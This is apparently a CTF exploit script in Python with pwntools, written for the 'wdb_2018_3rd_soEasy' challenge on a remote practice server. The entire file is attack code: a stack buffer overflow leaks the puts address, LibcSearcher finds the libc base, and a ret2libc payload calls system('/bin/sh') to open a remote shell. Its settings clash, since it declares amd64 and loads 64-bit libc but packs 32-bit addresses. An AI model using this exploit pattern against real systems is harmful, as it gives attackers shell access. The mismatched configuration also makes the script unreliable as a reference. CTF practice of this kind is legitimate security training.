#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/06/08 08:27:33
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''
# here put the import lib
from pwn import *
from LibcSearcher import *
import pwnlib
debug = 0
context.log_level = 'debug'
context.arch = 'amd64'
if debug:
    sh = process('wdb_2018_3rd_soEasy')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    IP = 'node3.buuoj.cn'
    port = 28699
    sh = remote(IP,port)
    libc = ELF('/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so')
elf = ELF('wdb_2018_3rd_soEasy')

sh.recvuntil("what do you want to do?\n")
payload = 'a' * 0x48 + 'a' * 0x4 + p32(elf.plt['puts']) + p32(0x804854B) + p32(elf.got['puts'])
sh.sendline(payload)
puts_addr = u32(sh.recvuntil("\xf7")[-4:])
libc = LibcSearcher('puts',puts_addr)
libc_base = puts_addr - libc.dump('puts')
system = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')
payload = 'a' * 0x48 + 'a' * 0x4 + p32(system) * 2 + p32(binsh_addr)
sh.sendline(payload)
sh.interactive()